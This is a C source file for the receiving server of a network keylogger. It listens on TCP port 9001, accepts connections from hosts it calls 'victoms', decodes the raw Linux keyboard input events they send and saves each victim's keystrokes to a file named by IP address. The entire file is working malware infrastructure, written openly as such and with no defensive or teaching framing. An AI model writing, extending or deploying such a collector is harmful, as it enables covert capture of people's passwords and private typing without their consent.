#include <linux/input.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>

#define BUFFER_LEN 2048

const char* keymap[] = {
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
    "ENTER", "LCTRL", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`",
    "LSHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "RSHIFT",
    "*", "LALT", "SPACE", "CAPSLOCK", // Add more keys as needed
};
typedef struct Victom{
    int fd;
    struct sockaddr_in victom_info;
} Victom;
void *handle_victom(void *args){
    Victom *new_victom = (Victom *) args;
    char buffer[BUFFER_LEN];
    char file_name[200];
    int readed_bytes = 0;
    printf("victom connected from :  %s:%i\n", inet_ntoa(new_victom->victom_info.sin_addr), ntohs(new_victom->victom_info.sin_port));
    sprintf(file_name, "./victom_record/%s.%i", inet_ntoa(new_victom->victom_info.sin_addr), new_victom->fd);
    FILE *key_logger = fopen(file_name, "w");
    if(key_logger == NULL){
        perror("open file: ");
        free(new_victom);
        return NULL;
    }
    while ((readed_bytes = read(new_victom->fd, buffer, BUFFER_LEN) ) > 0) {
            struct input_event *ev = (struct input_event *) buffer;
            if(ev->type== EV_KEY && ev->value == 1){
                if (ev->code < sizeof(keymap) / sizeof(keymap[0])){
                    if (strcmp(keymap[ev->code], "SPACE") == 0){
                        fprintf(key_logger, " ");
                        fflush(key_logger); // Flush to ensure data is written immediately
                    // Todo add an way to filter the unessary events
                    }else if(strcmp(keymap[ev->code], "BACKSPACE") == 0){
                        continue;
                    }
                    else if (strcmp(keymap[ev->code], "ENTER") == 0) {
                        fprintf(key_logger, "\n");
                        fflush(key_logger);
                    }
                    else if (strcmp(keymap[ev->code], "LALT") == 0 || strcmp(keymap[ev->code], "LSHIFT") == 0) {
                        continue;
                    }
                    else if (strcmp(keymap[ev->code], "LCTRL") == 0 || strcmp(keymap[ev->code], "TAB") == 0) {

                    }
                    else{
                        fprintf(key_logger, "%s", keymap[ev->code]); // Log the key itself
                        fflush(key_logger); // Flush to ensure data is written immediately
                    }
                }else{
                    fprintf(key_logger, "Key: %i\n",ev->code);
                    fflush(key_logger); // Force the OS into wrirting all the data in the buffer once it there.
                }
            }
            // fprintf(key_logger, "%i", event->value);
            // fflush(key_logger);
            memset(buffer, 0, BUFFER_LEN);
    }
    free(new_victom);
    return NULL;
}

int main(){
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    socklen_t len = sizeof(server);
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(9001);
    server.sin_family = AF_INET;
    memset(&server.sin_zero, 0, sizeof(server.sin_zero));


    // bind
    if(bind(server_fd, (struct sockaddr *) &server, len) < 0 ){
        perror("Can not bind the socket");
        exit(102);
    }

    if(listen(server_fd, 10) < 0){
        perror("Error while listen");
        exit(102);
    }

    printf("The server listen on %s:%i\n", inet_ntoa(server.sin_addr), ntohs(server.sin_port));

    while(1){
        // So not this point to a void address.
        Victom *client = malloc(sizeof(Victom));
        socklen_t addr_len = sizeof(client->victom_info);
        if((client->fd = accept(server_fd, (struct sockaddr *) &client->victom_info, &addr_len)) < 0){
            perror("accept client");
            free(client);
            continue; // to continue accept other clients
        }
        pthread_t thread_id;
        if(pthread_create(&thread_id, NULL, handle_victom, client) != 0){
            perror("cteate_thread");
            free(client);
            continue;
        }
        pthread_detach(thread_id);
    }

}
